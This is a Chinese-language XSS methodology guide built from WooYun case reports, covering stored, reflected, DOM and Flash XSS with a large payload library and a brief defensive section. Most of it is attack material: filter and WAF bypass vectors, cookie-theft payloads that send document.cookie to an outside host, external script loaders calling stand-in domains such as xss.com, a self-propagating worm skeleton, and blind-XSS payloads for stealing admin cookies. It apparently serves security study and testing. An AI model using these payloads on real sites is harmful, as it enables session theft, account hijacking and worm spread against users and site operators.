# XSS漏洞分析方法论

> 基于WooYun 7532个XSS漏洞案例的深度提炼，覆盖存储型/反射型/DOM型XSS的识别、测试、绕过与利用
>
> **声明**：本文档仅用于安全研究、漏洞分析和防御学习，所有Payload示例仅供教育目的

---

## 一、元认知框架：XSS漏洞的本质理解

### 1.1 核心原理

XSS的本质是**信任边界的突破**：
- **输入信任**：应用信任用户输入是"数据"而非"代码"
- **输出信任**：浏览器信任服务器返回的内容都是"安全的"
- **上下文混淆**：数据在不同上下文（HTML/JS/CSS/URL）中的语义变化

### 1.2 三层分析模型

```
+-----------------------------------------------------+
| 第一层：输入点识别 (Where does data enter?)          |
+---------------------------------+-------------------+
| 第二层：数据流追踪 (How does data flow?)             |
+---------------------------------+-------------------+
| 第三层：输出上下文 (Where does data render?)         |
+-----------------------------------------------------+
```

---

## 二、输出点识别与分类

### 2.1 高危输出点分类矩阵

| 输出点类型 | 触发条件 | 典型场景 | 案例来源 |
|-----------|---------|---------|---------|
| 用户昵称/签名 | 页面加载 | 个人主页、评论区、好友列表 | 大街网、游卡、YY客户端 |
| 搜索框回显 | 搜索操作 | 搜索结果页、历史记录 | 开心网、某搜索引擎贴吧 |
| 评论/留言 | 内容展示 | 论坛、博客、商品评价 | 汽车之家、苏宁、某互联网公司 |
| 文件名/描述 | 文件列表 | 网盘、相册、附件管理 | 某搜索引擎100G网盘 |
| 邮件正文/标题 | 打开邮件 | 邮箱系统 | Coremail、某邮箱服务、eYou |
| URL参数回显 | 页面渲染 | 分享链接、跳转页面 | 某互联网公司风铃、某社交平台某社交平台 |
| 图片alt/src | 图片加载 | 富文本编辑器 | 苏宁论坛 |
| Flash参数 | SWF加载 | 视频播放器、音乐播放器 | 某社交平台某社交平台、音悦台 |
| 订单备注/附言 | 后台查看 | 电商后台、工单系统 | xpshop、时代商城 |
| API回调参数 | JS执行 | JSONP、回调函数 | 音悦台Flash |

### 2.2 隐蔽输出点（易被忽略）

**案例洞察**：以下输出点在安全测试中经常被遗漏

1. **HTTP头部反射**
   - X-Forwarded-For -> 日志系统
   - Client-IP -> 后台IP显示
   - User-Agent -> 访问统计

2. **移动端/WAP同步**
   - WAP页面提交 -> PC端展示（某分类信息网站案例）
   - APP写入 -> Web端展示（融资城案例）

3. **客户端-Web同步**
   - 客户端昵称 -> Web页面（YY客户端案例）
   - 桌面应用设置 -> Web管理后台

4. **二次渲染点**
   - 草稿箱标题列表（某搜索引擎经验案例）
   - 审核列表（ZCMS案例）
   - 管理后台统计页

---

## 三、上下文分析方法

### 3.1 上下文类型识别

#### 3.1.1 HTML标签内容上下文

```html
<!-- 输出点在标签内容中 -->
<div>用户输入: {{OUTPUT}}</div>
```

**测试向量**：
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
```

#### 3.1.2 HTML属性上下文

```html
<!-- 输出点在属性值中 -->
<input value="{{OUTPUT}}">
<a href="{{OUTPUT}}">
<img src="{{OUTPUT}}">
```

**测试向量**：
```html
" onclick=alert(1) "
" onfocus=alert(1) autofocus="
"><script>alert(1)</script><"
" onmouseover=alert(1) x="
```

#### 3.1.3 JavaScript上下文

```javascript
// 输出点在JS字符串中
var name = '{{OUTPUT}}';
var data = {"key": "{{OUTPUT}}"};
callback('{{OUTPUT}}');
```

**测试向量**：
```javascript
';alert(1);//
'-alert(1)-'
\';alert(1);//
</script><script>alert(1)</script>
```

**实战案例（某社交平台某社交平台）**：
```javascript
// 原始代码
backurl=http://...?url=aaaaaaaa',a:(alert(1))//
// 闭合JSON对象实现代码执行
```

#### 3.1.4 URL上下文

```html
<a href="{{OUTPUT}}">
<iframe src="{{OUTPUT}}">
```

**测试向量**：
```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

#### 3.1.5 CSS上下文

```html
<div style="{{OUTPUT}}">
<style>{{OUTPUT}}</style>
```

**测试向量（IE专属）**：
```css
xss:expression(alert(1))
xss:\65\78\70\72\65\73\73\69\6f\6e(alert(1))
```

### 3.2 上下文快速判断流程

```
+-- 查看源码中输出位置
|
+-- 在<script>标签内？ -> JavaScript上下文
|   |-- 检查引号类型（单/双）、是否在字符串/对象/函数中
|
+-- 在HTML属性中？ -> 属性上下文
|   |-- 检查属性类型（事件/src/href/普通）
|
+-- 在标签内容中？ -> HTML上下文
|   |-- 检查是否有特殊标签（textarea/title/script/style）
|
+-- 在URL中？ -> URL上下文
|   |-- 检查协议限制、编码处理
|
+-- 在CSS中？ -> CSS上下文
    |-- 检查是否支持expression
```

---

## 四、绕过技巧大全

### 4.1 编码绕过

#### 4.1.1 HTML实体编码

**场景**：过滤了`<>`但未过滤HTML实体

```html
<!-- 原始过滤 -->
<script> -> 被过滤

<!-- 绕过方式 -->
&#60;script&#62;alert(1)&#60;/script&#62;
&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
```

**实战案例（某社交平台汽车论坛）**：
```html
<!-- 直接插入被拦截 -->
<script>alert(document.cookie)</script>

<!-- HTML 10进制实体绕过成功 -->
&#60;script&#62;alert(document.cookie)&#60;/script&#62;
```

#### 4.1.2 Unicode编码

**场景**：WAF或过滤器未处理Unicode

```javascript
// 原始
<iframe/onload=alert(1)>

// Unicode编码绕过
\u003ciframe\u002fonload\u003dalert(1)\u003e

// 实战案例（某电脑厂商论坛Flash XSS）
https://example.com/[已脱敏]
```

#### 4.1.3 Base64编码

**场景**：data协议配合base64

```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

#### 4.1.4 CSS编码（IE）

```css
/* 十六进制编码 */
xss:\65\78\70\72\65\73\73\69\6f\6e(alert(1))
```

### 4.2 标签变形绕过

#### 4.2.1 大小写混淆

```html
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x OnErRoR=alert(1)>
```

#### 4.2.2 标签分隔符变形

```html
<script/src=//xss.com/x.js>       <!-- 斜杠替代空格 -->
<script	src=//xss.com/x.js>       <!-- Tab替代空格 -->
<script
src=//xss.com/x.js>               <!-- 换行替代空格 -->
```

#### 4.2.3 属性分隔符变形

```html
<img src=x onerror=alert(1)>      <!-- 无引号 -->
<img src=x onerror='alert(1)'>    <!-- 单引号 -->
<img src=x onerror="alert(1)">    <!-- 双引号 -->
```

### 4.3 事件触发绕过

#### 4.3.1 替代事件处理器

```html
<!-- 常见事件被过滤时的替代方案 -->
<img src=x onerror=alert(1)>                    <!-- 图片加载错误 -->
<svg onload=alert(1)>                           <!-- SVG加载 -->
<body onload=alert(1)>                          <!-- 页面加载 -->
<input onfocus=alert(1) autofocus>              <!-- 自动聚焦 -->
<select autofocus onfocus=alert(1)>             <!-- 下拉框聚焦 -->
<textarea autofocus onfocus=alert(1)>           <!-- 文本域聚焦 -->
<marquee onstart=alert(1)>                      <!-- 滚动开始 -->
<video><source onerror=alert(1)>                <!-- 视频源错误 -->
<audio src=x onerror=alert(1)>                  <!-- 音频错误 -->
<details open ontoggle=alert(1)>                <!-- 详情切换 -->
<frameset onload=alert(1)>                      <!-- 框架加载 -->
```

**实战案例（eYou邮箱）**：
```html
<!-- autofocus + onfocus组合 -->
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(2)>
<textarea autofocus onfocus=alert(3)>
```

#### 4.3.2 用户交互事件

```html
<div onmouseover=alert(1)>hover me</div>
<div onmouseout=alert(1)>leave me</div>
<div onclick=alert(1)>click me</div>
<div oncontextmenu=alert(1)>right click</div>
```

### 4.4 WAF/过滤器绕过

#### 4.4.1 字符插入绕过

**实战案例（安全宝绕过）**：
```html
<!-- 在<>前后加点号绕过 -->
.<script src=http://localhost/1.js>.
```

#### 4.4.2 注释干扰

```html
<!--[if true]><img onerror=alert(1) src=-->
```

#### 4.4.3 空字符绕过

```html
<scr\x00ipt>alert(1)</script>
<img src=x o\x00nerror=alert(1)>
```

#### 4.4.4 双写绕过

```html
<!-- 过滤器删除一次script -->
<scrscriptipt>alert(1)</scrscriptipt>
```

### 4.5 长度限制绕过

#### 4.5.1 外部JS加载

```html
<!-- 最短外部加载 -->
<script src=//xss.pw/j>

<!-- 配合短域名 -->
<script src=//t.cn/xxx>
```

#### 4.5.2 分段注入

**实战案例（人人网）**：
```javascript
// 使用String.fromCharCode绕过长度限制和关键字过滤
// 将payload编码为字符码序列后执行
```

#### 4.5.3 DOM拼接

```javascript
// 通过DOM创建script标签
var s=document.createElement('script');s.src='//x.com/x.js';document.body.appendChild(s);
```

### 4.6 HTTPOnly绕过

#### 4.6.1 Flash方式

**实战案例（某云盘）**：
```
利用Flash接口获取用户信息，绕过httponly限制
通过Flash调用JS接口实现cookie替代方案
```

#### 4.6.2 CSRF替代

当无法获取Cookie时，改用CSRF方式：
- 执行敏感操作（修改密码、添加管理员）
- 读取页面token
- 发送钓鱼表单

---

## 五、DOM XSS专项分析

### 5.1 危险的DOM源

```javascript
// 用户可控的DOM源
document.URL
document.documentURI
document.URLUnencoded
document.baseURI
document.referrer
location
location.href
location.search
location.hash
location.pathname
window.name
document.cookie
```

### 5.2 危险的DOM汇

```javascript
// 直接执行类函数
setTimeout()
setInterval()
Function()

// HTML注入（危险方法，应避免使用）
innerHTML
outerHTML
insertAdjacentHTML()

// 属性设置
element.src
element.href
element.action
```

### 5.3 DOM XSS案例分析

**案例1：document.domain设置不当（某互联网公司）**

```javascript
// 漏洞代码
var g_sDomain = QSFL.excore.getURLParam("domain");
document.domain = g_sDomain;

// 利用方式（Webkit浏览器）
https://example.com/[已脱敏]
// 可设置document.domain为"com"，突破同源策略
```

**案例2：Flash htmlText注入（某社交平台某社交平台）**

```actionscript
// Flash中的htmlText支持<img>标签加载SWF
this.txt_songName.htmlText = param1.songName;

// 利用方式
// 歌曲名设置为: <img src="https://example.com/[已脱敏]">
// Flash会加载并执行恶意SWF
```

### 5.4 DOM XSS测试流程

```
1. 识别页面中的JavaScript代码
2. 查找DOM源的使用位置
3. 追踪数据流向DOM汇
4. 检查是否有过滤/编码
5. 构造PoC验证
```

---

## 六、Flash XSS专项分析

### 6.1 危险的Flash参数

```actionscript
// ExternalInterface.call注入
ExternalInterface.call("function", userInput);

// 危险的allowScriptAccess设置
allowscriptaccess="always"  // 允许跨域JS调用

// navigateToURL
navigateToURL(new URLRequest("javascript:alert(1)"));
```

### 6.2 crossdomain.xml利用

**实战案例（某邮箱服务）**：
```xml
<cross-domain-policy>
    <allow-access-from domain="*.某域名.com"/>
</cross-domain-policy>
```

利用思路：
1. 在*.某域名.com下找到可上传点（图片伪装SWF）
2. 上传恶意SWF
3. 通过Flash读取某邮箱服务数据

### 6.3 Flash XSS Rootkit

**实战案例（音悦台）**：
```
1. Flash播放器存储LocalSharedObject(LSO)
2. LSO数据在页面中被读取并执行
3. 攻击者污染LSO，实现持久化XSS
```

---

## 七、实战Payload库

### 7.1 基础探测Payload

```html
<!-- 简单弹窗 -->
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>

<!-- 图片错误触发 -->
<img src=x onerror=alert(1)>
<img/src=x onerror=alert(1)>

<!-- SVG触发 -->
<svg onload=alert(1)>
<svg/onload=alert(1)>

<!-- 鼠标事件 -->
"onmouseover="alert(1)"
' onmouseover='alert(1)'
```

### 7.2 Cookie窃取Payload

```html
<!-- 基础窃取 -->
<script>new Image().src="https://example.com/[已脱敏]"+document.cookie</script>

<!-- 使用fetch -->
<script>fetch('https://example.com/[已脱敏]'+document.cookie)</script>

<!-- 通过img发送 -->
<img src=x onerror="new Image().src='https://example.com/[已脱敏]'+document.cookie">
```

### 7.3 外部JS加载Payload

```html
<!-- 标准方式 -->
<script src=//xss.com/x.js></script>

<!-- 动态创建 -->
<script>var s=document.createElement('script');s.src='//xss.com/x.js';document.body.appendChild(s)</script>

<!-- 超短Payload -->
<script src=//xss.pw/j>
```

### 7.4 绕过类Payload

```html
<!-- Unicode编码 -->
<iframe/onload=alert(1)>  ->  转为Unicode

<!-- HTML实体 -->
&#60;script&#62;alert(1)&#60;/script&#62;

<!-- Base64 -->
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">

<!-- 字符串拼接绕过关键字 -->
<script>window['al'+'ert'](1)</script>

<!-- fromCharCode绕过 -->
<script>String.fromCharCode(97,108,101,114,116,40,49,41)</script>
```

### 7.5 蠕虫类Payload示例

**大街网蠕虫代码结构**：
```javascript
function worm(){
    jQuery.post("https://example.com/[已脱敏]", {
        "content": "<payload_with_self_propagation>",
        // ... other params
    })
}
worm()
```

**核心要素**：
1. 获取当前用户身份（cookie/token）
2. 构造自动发布内容
3. 内容包含相同的恶意代码
4. 触发条件：查看/访问

---

## 八、测试流程与方法论

### 8.1 黑盒测试流程

```
+------------------------------------------------+
| 1. 信息收集                                     |
|    - 识别所有输入点                              |
|    - 记录参数名和位置                            |
|    - 确定数据类型和用途                          |
+----------------------+-------------------------+
                       |
                       v
+------------------------------------------------+
| 2. 初始探测                                     |
|    - 输入特殊字符: <>"';&                       |
|    - 观察响应中的编码情况                        |
|    - 确定输出上下文                              |
+----------------------+-------------------------+
                       |
                       v
+------------------------------------------------+
| 3. Payload构造                                  |
|    - 根据上下文选择payload                      |
|    - 尝试闭合现有标签/属性                       |
|    - 测试事件处理器                              |
+----------------------+-------------------------+
                       |
                       v
+------------------------------------------------+
| 4. 绕过测试                                     |
|    - 编码绕过                                   |
|    - 标签变形                                   |
|    - 替代事件                                   |
+----------------------+-------------------------+
                       |
                       v
+------------------------------------------------+
| 5. 验证利用                                     |
|    - 确认代码执行                               |
|    - 测试Cookie获取                             |
|    - 验证实际危害                               |
+------------------------------------------------+
```

### 8.2 检测清单

**输入点检查**：
- [ ] URL参数（GET）
- [ ] 表单字段（POST）
- [ ] HTTP头部（User-Agent, Referer, X-Forwarded-For）
- [ ] Cookie值
- [ ] 文件名/文件内容
- [ ] JSON/XML数据

**输出点检查**：
- [ ] 直接HTML输出
- [ ] JavaScript变量赋值
- [ ] HTML属性中
- [ ] URL中
- [ ] CSS中
- [ ] 错误消息中

**上下文检查**：
- [ ] 是否在标签内
- [ ] 是否在属性内
- [ ] 是否在JS字符串内
- [ ] 引号类型（单/双/无）
- [ ] 是否有HTML编码
- [ ] 是否有JS编码

### 8.3 盲打XSS策略

**适用场景**：
- 后台管理系统
- 审核系统
- 工单系统
- 留言反馈

**盲打Payload示例**：
```html
<script src=https://example.com/[已脱敏]
```

**成功案例**：
- 成都市公安局车辆管理所：留言盲打获取后台
- 快速问医生：个人简介盲打获取后台Cookie
- 游卡：用户昵称盲打获取管理员

---

## 九、漏洞组合利用

### 9.1 XSS + CSRF

**案例（ZCMS）**：
1. 通过XSS获取页面Token
2. 利用Token构造CSRF请求
3. 执行管理操作（删除、修改）

### 9.2 XSS + SQL注入

**案例（时代互联邮件系统）**：
1. XSS盲打获取管理员Cookie
2. 使用Cookie访问后台功能
3. 后台存在SQL注入进一步利用

### 9.3 XSS + 文件上传

**案例（PHPYUN）**：
1. 发现KindEditor演示文件
2. 上传包含XSS的HTML文件
3. 诱导管理员访问触发

### 9.4 XSS -> 账号劫持 -> 权限提升

**案例（某社交空间蠕虫）**：
```
XSS触发 -> 获取skey -> 伪造Cookie ->
自动发某社交平台 -> 自动加关注 -> 蠕虫传播
```

---

## 十、防御视角的洞察

### 10.1 常见防御失误

1. **只过滤script标签**：忽略其他标签和事件
2. **只过滤小写**：大小写混淆绕过
3. **黑名单过滤**：总有遗漏的标签/事件
4. **前端过滤**：抓包绕过
5. **单次过滤**：双写绕过
6. **只过滤输入**：忽略二次编码问题

### 10.2 有效防御措施

1. **输出编码**：根据上下文选择正确编码
   - HTML上下文：HTML实体编码
   - JS上下文：JavaScript编码
   - URL上下文：URL编码

2. **CSP策略**：限制脚本来源
3. **HTTPOnly**：保护Cookie
4. **输入验证**：白名单验证

---

## 附录：案例索引

| 漏洞类型 | 典型案例 | 关键技术点 |
|---------|---------|-----------|
| 存储型XSS | 某分类信息网站、汽车之家、大街网 | 用户输入存储、多点触发 |
| 反射型XSS | 开心网、某国有银行、某门户网站 | URL参数回显 |
| DOM XSS | 某互联网公司document.domain、某社交平台Flash | 客户端代码执行 |
| Flash XSS | 音悦台Rootkit、某邮箱服务crossdomain | SWF安全配置 |
| mXSS | 某社交平台邮箱、某邮箱服务 | 浏览器解析差异 |
| 盲打XSS | 成都公安、苏宁、快速问医生 | 后台触发 |
| 蠕虫XSS | 大街网、某社交空间 | 自动传播 |

---

*本文档基于WooYun真实漏洞案例提炼，仅供安全研究和防御参考使用*
